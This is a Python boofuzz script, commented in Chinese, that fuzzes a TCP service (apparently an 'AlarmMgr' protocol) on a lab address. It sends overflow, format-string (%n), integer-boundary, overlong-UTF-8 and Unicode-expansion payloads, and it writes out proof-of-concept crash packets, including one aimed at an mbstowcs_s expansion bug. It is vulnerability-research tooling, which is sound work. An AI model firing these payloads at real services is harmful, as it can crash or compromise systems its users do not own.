#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from boofuzz import *
import time
import struct

from boofuzz.mutation import Mutation

# 原始数据包拆分
PACKET_PARTS = {
    "guid1": "42d5cfc7f80bcdd311aa1000a0c9ecfd",      # 16字节 GUID
    "guid2": "9fff9855c83d25d411aa2700a0c9ecfd9f",    # 16字节 GUID
    "counter": "01000000",                              # 4字节计数器
    "string": "41006c00610072006d004d00670072000000",  # UTF-16LE "AlarmMgr\x00\x00"
    "type": "04000000",                                 # 4字节类型
    "padding": "00000000f4380000"                       # 10字节填充
}


class MultibyteExpansionMutator:
    """多字节膨胀序列变异器"""

    @staticmethod
    def generate_overlong_utf8(char='\x00', length=2):
        """生成过长UTF-8编码"""
        ord_char = ord(char) if isinstance(char, str) else char

        if length == 2:
            return bytes([0xC0 | (ord_char >> 6), 0x80 | (ord_char & 0x3F)])
        elif length == 3:
            return bytes([0xE0, 0x80 | (ord_char >> 6), 0x80 | (ord_char & 0x3F)])
        elif length == 4:
            return bytes([0xF0, 0x80, 0x80 | (ord_char >> 6), 0x80 | (ord_char & 0x3F)])
        elif length == 5:
            return bytes([0xF8, 0x80, 0x80, 0x80 | (ord_char >> 6), 0x80 | (ord_char & 0x3F)])
        elif length == 6:
            return bytes([0xFC, 0x80, 0x80, 0x80, 0x80 | (ord_char >> 6), 0x80 | (ord_char & 0x3F)])

        return bytes([ord_char]) if isinstance(char, int) else char.encode('utf-8')

    @staticmethod
    def create_expansion_payloads():
        """创建各种膨胀型载荷"""
        payloads = []

        # 1. 过长编码的"AlarmMgr"
        overlong_alarmmgr = b''
        for char in "AlarmMgr\x00\x00":
            if char == '\x00':
                overlong_alarmmgr += MultibyteExpansionMutator.generate_overlong_utf8('\x00', 4)
            else:
                overlong_alarmmgr += MultibyteExpansionMutator.generate_overlong_utf8(char, 3)
        payloads.append(overlong_alarmmgr)

        # 2. 组合字符膨胀
        combining = "AlarmMgr"
        for i in range(len(combining)):
            combining = combining[:i+1] + '\u0300\u0301\u0302\u0303' + combining[i+1:]
        payloads.append(combining.encode('utf-8'))

        # 3. 零宽字符注入
        zero_width = ""
        base = "AlarmMgr"
        for char in base:
            zero_width += char + '\u200B\u200C\u200D' * 5
        payloads.append(zero_width.encode('utf-8'))

        # 4. 代理对字符串
        surrogate = "AlarmMgr"
        # 插入需要代理对的字符
        expanded = ""
        for char in surrogate:
            expanded += char + '\U0001F600\U00010000'
        payloads.append(expanded.encode('utf-8'))

        # 5. 混合NULL字节编码
        null_variations = b''
        null_variations += b'AlarmMgr'
        null_variations += b'\xC0\x80'  # 2字节过长NULL
        null_variations += b'\xE0\x80\x80'  # 3字节过长NULL
        null_variations += b'\xF0\x80\x80\x80'  # 4字节过长NULL
        payloads.append(null_variations)

        return payloads


def define_structured_protocol():
    """
    定义结构化的协议模糊测试
    """

    # 策略1：对每个字段进行单独模糊测试
    s_initialize("field_by_field_fuzz")

    # GUID1 - 保持固定或轻微变异
    with s_block("guid1_block"):
        s_static(bytes.fromhex(PACKET_PARTS["guid1"]))
        # 可选：对GUID进行轻微变异
        s_random(bytes.fromhex(PACKET_PARTS["guid1"]), min_length=16, max_length=16,
                 num_mutations=10, name="guid1_mutated", fuzzable=True)

    # GUID2 - 保持固定或轻微变异
    with s_block("guid2_block"):
        s_static(bytes.fromhex(PACKET_PARTS["guid2"]))

    # 计数器字段 - 重点模糊测试
    with s_block("counter_block"):
        s_group("counter_values", values=[
            b"\x00\x00\x00\x00",  # 0
            b"\x01\x00\x00\x00",  # 1 (原始值)
            b"\xff\xff\xff\xff",  # -1
            b"\x00\x00\x00\x80",  # INT_MIN
            b"\xff\xff\xff\x7f",  # INT_MAX
            b"\x00\x10\x00\x00",  # 4096
            b"\x00\x00\x10\x00",  # 1048576
        ])

    # UTF-16LE字符串 - 重点模糊测试
    with s_block("string_block"):
        # 原始的 "AlarmMgr\x00\x00"
        s_static(bytes.fromhex(PACKET_PARTS["string"]))

    # 类型字段
    with s_block("type_block"):
        s_group("type_values", values=[
            b"\x00\x00\x00\x00",  # 0
            b"\x04\x00\x00\x00",  # 4 (原始值)
            b"\xff\xff\xff\xff",  # -1
            b"\x00\x01\x00\x00",  # 256
        ])

    # 填充字段
    with s_block("padding_block"):
        s_static(bytes.fromhex(PACKET_PARTS["padding"]))

    # 模糊测试载荷
    with s_block("fuzz_payload"):
        s_string("A" * 100, name="overflow_payload", max_len=10000, fuzzable=True)


    # 策略2：字符串溢出测试
    s_initialize("string_overflow_fuzz")

    # 固定前缀
    s_static(bytes.fromhex(PACKET_PARTS["guid1"]))
    s_static(bytes.fromhex(PACKET_PARTS["guid2"]))
    s_static(bytes.fromhex(PACKET_PARTS["counter"]))

    # 超长UTF-16LE字符串
    with s_block("overflow_string"):
        # 各种长度的UTF-16LE字符串
        s_string("A" * 50, name="short_overflow", encoding="utf-16-le", max_len=200, fuzzable=True)
        s_string("B" * 500, name="medium_overflow", encoding="utf-16-le", max_len=2000, fuzzable=True)
        s_string("C" * 5000, name="long_overflow", encoding="utf-16-le", max_len=20000, fuzzable=True)

    # 后续字段
    s_static(bytes.fromhex(PACKET_PARTS["type"]))
    s_static(bytes.fromhex(PACKET_PARTS["padding"]))


    # 策略3：格式化字符串和特殊字符
    s_initialize("format_string_fuzz")

    # 固定前缀
    s_static(bytes.fromhex(PACKET_PARTS["guid1"]))
    s_static(bytes.fromhex(PACKET_PARTS["guid2"]))
    s_static(bytes.fromhex(PACKET_PARTS["counter"]))

    # 格式化字符串攻击
    with s_block("format_strings"):
        format_payloads = [
            "%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x%x",
            "%n%n%n%n%n%n%n%n",
            "%d%d%d%d%d%d%d%d",
            "%%%%%%%%%%%%%%%%%%",
            "${IFS}${IFS}${IFS}",
            "../../../../windows/system32/calc.exe",
            "\x00\x00\x00\x00" * 100,  # NULL bytes
            "\x41\x00" * 1000,          # UTF-16LE 'A'
            "\xff\xfe" * 500,           # BOM markers
        ]

        for i, payload in enumerate(format_payloads):
            if isinstance(payload, str):
                payload_bytes = payload.encode('utf-16-le')
            else:
                payload_bytes = payload
            s_static(payload_bytes, name=f"format_payload_{i}")

    # 后续字段
    s_static(bytes.fromhex(PACKET_PARTS["type"]))
    s_static(bytes.fromhex(PACKET_PARTS["padding"]))


    # 策略4：完全随机数据
    s_initialize("random_fuzz")

    # 原始数据作为前缀
    original_data = ''.join(PACKET_PARTS.values())
    s_static(bytes.fromhex(original_data))

    # 随机数据
    with s_block("random_data"):
        s_random(b"\x00" * 100, min_length=100, max_length=10000,
                 num_mutations=50, name="random_payload")


    # 策略5：边界值测试
    s_initialize("boundary_fuzz")

    # 测试各种边界长度
    boundary_lengths = [
        63, 64, 65,      # 接近64字节边界
        127, 128, 129,   # 接近128字节边界
        255, 256, 257,   # 接近256字节边界
        1023, 1024, 1025, # 接近1KB边界
        4095, 4096, 4097, # 接近4KB边界
        8191, 8192, 8193, # 接近8KB边界
    ]

    original_data = ''.join(PACKET_PARTS.values())

    for length in boundary_lengths:
        s_static(bytes.fromhex(original_data))
        s_static(b"A" * length, name=f"boundary_{length}")


    # 策略6：多字节膨胀型序列测试（新增）
    s_initialize("multibyte_expansion_fuzz")

    # 固定前缀
    s_static(bytes.fromhex(PACKET_PARTS["guid1"]))
    s_static(bytes.fromhex(PACKET_PARTS["guid2"]))
    s_static(bytes.fromhex(PACKET_PARTS["counter"]))

    # 使用多字节膨胀载荷
    with s_block("expansion_payloads"):
        expansion_payloads = MultibyteExpansionMutator.create_expansion_payloads()

        # 测试每种膨胀载荷
        for i, payload in enumerate(expansion_payloads):
            s_static(payload, name=f"expansion_{i}")

        # 生成动态膨胀载荷
        # 长度膨胀攻击 - strlen()显示较短，实际转换后很长
        for visible_len in [30, 50, 63, 100]:  # 视觉长度
            # 创建过长编码载荷
            overlong_payload = b''
            for j in range(visible_len):
                # 每个'A'使用不同长度的过长编码
                overlong_payload += MultibyteExpansionMutator.generate_overlong_utf8('A', (j % 4) + 2)
            s_static(overlong_payload, name=f"overlong_len_{visible_len}")

            # 创建组合字符载荷
            combining_payload = ''
            for j in range(visible_len):
                combining_payload += 'A' + '\u0300' * (j % 10 + 1)  # 1-10个组合符
            s_static(combining_payload.encode('utf-8'), name=f"combining_len_{visible_len}")

    # 后续字段
    s_static(bytes.fromhex(PACKET_PARTS["type"]))
    s_static(bytes.fromhex(PACKET_PARTS["padding"]))

    # 添加溢出数据
    s_string("X" * 1000, name="expansion_overflow", encoding="utf-8", max_len=5000, fuzzable=True)


    # 策略7：UTF转换边界测试（新增）
    s_initialize("utf_conversion_boundary_fuzz")

    # 固定前缀
    s_static(bytes.fromhex(PACKET_PARTS["guid1"]))
    s_static(bytes.fromhex(PACKET_PARTS["guid2"]))
    s_static(bytes.fromhex(PACKET_PARTS["counter"]))

    # 测试各种UTF转换边界情况
    with s_block("utf_boundary_cases"):
        # 非法UTF-8序列
        illegal_utf8_sequences = [
            b'\x80',                    # 独立的续字节
            b'\xC0',                    # 不完整的2字节序列
            b'\xE0\x80',                # 不完整的3字节序列
            b'\xF0\x80\x80',            # 不完整的4字节序列
            b'\xFF\xFE',                # UTF-16 BOM in UTF-8
            b'\xED\xA0\x80',            # 高代理项的UTF-8编码
            b'\xED\xBF\xBF',            # 低代理项的UTF-8编码
            b'\xF4\x90\x80\x80',        # 超出Unicode范围
        ]

        for i, seq in enumerate(illegal_utf8_sequences):
            s_static(b'AlarmMgr' + seq * 100, name=f"illegal_utf8_{i}")

        # 极端Unicode字符
        extreme_chars = [
            '\U0010FFFF' * 50,          # 最大有效Unicode
            '\U0001F4A9' * 100,         # Emoji (pile of poo)
            '\U000E0001' * 80,          # 标签字符
            '\uFFFD' * 200,             # 替换字符
        ]

        for i, chars in enumerate(extreme_chars):
            s_static(chars.encode('utf-8'), name=f"extreme_unicode_{i}")

    # 后续字段
    s_static(bytes.fromhex(PACKET_PARTS["type"]))
    s_static(bytes.fromhex(PACKET_PARTS["padding"]))


def create_custom_mutations():
    """
    创建自定义变异器
    """
    class UTF16Mutator(Mutation):
        def __init__(self):
            self.mutations = [
                # Unicode特殊字符
                "\U0001F600" * 100,  # Emoji
                "\u0000" * 1000,      # NULL
                "\uffff" * 500,       # 最大Unicode
                "测试" * 1000,        # 中文
                "🔥💀👻" * 200,      # 混合emoji
                "\r\n" * 2000,        # CRLF
                "../" * 500,          # 路径遍历
            ]
            self.index = 0

        def mutate(self):
            if self.index >= len(self.mutations):
                self.index = 0

            mutation = self.mutations[self.index]
            self.index += 1
            return mutation.encode('utf-16-le')

    return UTF16Mutator()


def main():
    # 目标配置
    TARGET_IP = "192.168.52.130"
    TARGET_PORT = 5413

    # 创建会话
    session = Session(
        target=Target(
            connection=SocketConnection(TARGET_IP, TARGET_PORT, proto='tcp')
        ),
        receive_data_after_each_request=True,
        receive_data_after_fuzz=True,
        crash_threshold_element=12,
        web_port=26000,
        # 添加睡眠时间以避免过快发送
        sleep_time=0.1,
    )

    # 定义协议
    define_structured_protocol()

    # 连接所有测试用例
    test_cases = [
        "field_by_field_fuzz",
        "string_overflow_fuzz",
        "format_string_fuzz",
        "random_fuzz",
        "boundary_fuzz",
        "multibyte_expansion_fuzz",      # 新增
        "utf_conversion_boundary_fuzz"    # 新增
    ]

    # 构建测试链
    for i in range(len(test_cases) - 1):
        session.connect(s_get(test_cases[i]), s_get(test_cases[i + 1]))

    # 首个测试用例
    session.connect(s_get(test_cases[0]))

    print("[*] 结构化TCP协议模糊测试")
    print(f"[*] 目标: {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] Web界面: http://localhost:26000")
    print(f"[*] 测试策略: {len(test_cases)}种")
    print("[*] 数据包结构:")
    for name, value in PACKET_PARTS.items():
        print(f"    - {name}: {len(value)//2} bytes")
    print("\n[*] 新增多字节膨胀测试:")
    print("    - 过长UTF-8编码")
    print("    - 组合字符膨胀")
    print("    - 零宽字符注入")
    print("    - UTF转换边界")
    print("\n[*] 开始模糊测试...")

    # 启动模糊测试
    session.fuzz()


def generate_poc_samples():
    """
    生成POC测试样本
    """
    print("[*] 生成POC测试样本...\n")

    original_data = ''.join(PACKET_PARTS.values())
    original_bytes = bytes.fromhex(original_data)

    # POC 1: 简单溢出
    poc1 = original_bytes + b"A" * 10000
    print(f"POC 1 - 简单溢出:")
    print(f"  长度: {len(poc1)} 字节")
    print(f"  载荷: 原始数据 + 'A'*10000")
    print(f"  Hex预览: {poc1[:100].hex()}...\n")

    # POC 2: UTF-16LE溢出
    overflow_string = "X" * 5000
    utf16_overflow = overflow_string.encode('utf-16-le')
    poc2 = (bytes.fromhex(PACKET_PARTS["guid1"]) +
            bytes.fromhex(PACKET_PARTS["guid2"]) +
            bytes.fromhex(PACKET_PARTS["counter"]) +
            utf16_overflow)
    print(f"POC 2 - UTF-16LE字符串溢出:")
    print(f"  长度: {len(poc2)} 字节")
    print(f"  载荷: GUID1 + GUID2 + Counter + UTF16('X'*5000)")
    print(f"  Hex预览: {poc2[:100].hex()}...\n")

    # POC 3: 格式化字符串
    format_string = "%x" * 100 + "%n" * 10
    poc3 = original_bytes + format_string.encode('utf-16-le')
    print(f"POC 3 - 格式化字符串:")
    print(f"  长度: {len(poc3)} 字节")
    print(f"  载荷: 原始数据 + UTF16('%x'*100 + '%n'*10)")
    print(f"  Hex预览: {poc3[:100].hex()}...\n")

    # POC 4: 整数溢出
    poc4 = (bytes.fromhex(PACKET_PARTS["guid1"]) +
            bytes.fromhex(PACKET_PARTS["guid2"]) +
            b"\xff\xff\xff\x7f" +  # INT_MAX
            bytes.fromhex(PACKET_PARTS["string"]) +
            b"\xff\xff\xff\xff" +  # -1
            bytes.fromhex(PACKET_PARTS["padding"]) +
            b"A" * 5000)
    print(f"POC 4 - 整数溢出:")
    print(f"  长度: {len(poc4)} 字节")
    print(f"  载荷: 修改counter=INT_MAX, type=-1, + 'A'*5000")
    print(f"  Hex预览: {poc4[:100].hex()}...\n")

    # POC 5: 多字节膨胀型载荷（新增）
    # 生成过长编码的AlarmMgr字符串
    overlong_alarmmgr = b''
    for char in "AlarmMgr":
        overlong_alarmmgr += MultibyteExpansionMutator.generate_overlong_utf8(char, 4)  # 4字节过长编码

    # 添加过长NULL
    overlong_alarmmgr += MultibyteExpansionMutator.generate_overlong_utf8('\x00', 5)
    overlong_alarmmgr += MultibyteExpansionMutator.generate_overlong_utf8('\x00', 6)

    # 继续添加膨胀载荷
    for i in range(1000):
        overlong_alarmmgr += MultibyteExpansionMutator.generate_overlong_utf8('A', (i % 5) + 2)

    poc5 = (bytes.fromhex(PACKET_PARTS["guid1"]) +
            bytes.fromhex(PACKET_PARTS["guid2"]) +
            bytes.fromhex(PACKET_PARTS["counter"]) +
            overlong_alarmmgr)

    print(f"POC 5 - 多字节膨胀攻击:")
    print(f"  长度: {len(poc5)} 字节")
    print(f"  载荷: GUID1 + GUID2 + Counter + 过长UTF-8编码")
    print(f"  说明: strlen()显示较短，但mbstowcs_s转换后会膨胀")
    print(f"  Hex预览: {poc5[:100].hex()}...\n")

    # POC 6: 组合字符膨胀（新增）
    combining_string = "AlarmMgr"
    combined = ''
    for char in combining_string:
        combined += char
        # 每个字符后添加10个组合符
        combined += '\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307\u0308\u0309'

    # 添加NULL和更多膨胀数据
    combined += '\x00\x00'
    for i in range(500):
        combined += 'X' + '\u0300' * (i % 20 + 1)

    poc6 = (bytes.fromhex(PACKET_PARTS["guid1"]) +
            bytes.fromhex(PACKET_PARTS["guid2"]) +
            bytes.fromhex(PACKET_PARTS["counter"]) +
            combined.encode('utf-8'))

    print(f"POC 6 - 组合字符膨胀:")
    print(f"  长度: {len(poc6)} 字节")
    print(f"  载荷: GUID1 + GUID2 + Counter + 组合字符")
    print(f"  说明: 视觉上显示较短，实际占用大量空间")
    print(f"  Hex预览: {poc6[:100].hex()}...\n")

    # 保存POC到文件
    with open("tcp_fuzzer_pocs.txt", "w") as f:
        f.write("TCP Fuzzer POC Samples\n")
        f.write("=" * 50 + "\n\n")

        f.write("POC 1 - Simple Overflow:\n")
        f.write(f"{poc1.hex()}\n\n")

        f.write("POC 2 - UTF-16LE Overflow:\n")
        f.write(f"{poc2.hex()}\n\n")

        f.write("POC 3 - Format String:\n")
        f.write(f"{poc3.hex()}\n\n")

        f.write("POC 4 - Integer Overflow:\n")
        f.write(f"{poc4.hex()}\n\n")

        f.write("POC 5 - Multibyte Expansion Attack:\n")
        f.write(f"{poc5.hex()}\n\n")

        f.write("POC 6 - Combining Character Expansion:\n")
        f.write(f"{poc6.hex()}\n\n")

    print("[+] POC样本已保存到 tcp_fuzzer_pocs.txt")


if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1:
        if sys.argv[1] == "--test":
            # 生成测试样本
            generate_poc_samples()
        elif sys.argv[1] == "--help":
            print("使用方法:")
            print("  python3 structured_tcp_fuzzer.py          # 运行模糊测试")
            print("  python3 structured_tcp_fuzzer.py --test   # 生成POC样本")
            print("  python3 structured_tcp_fuzzer.py --help   # 显示帮助")
    else:
        try:
            main()
        except KeyboardInterrupt:
            print("\n[!] 用户中断模糊测试")
        except Exception as e:
            print(f"[!] 错误: {str(e)}")
            import traceback
            traceback.print_exc()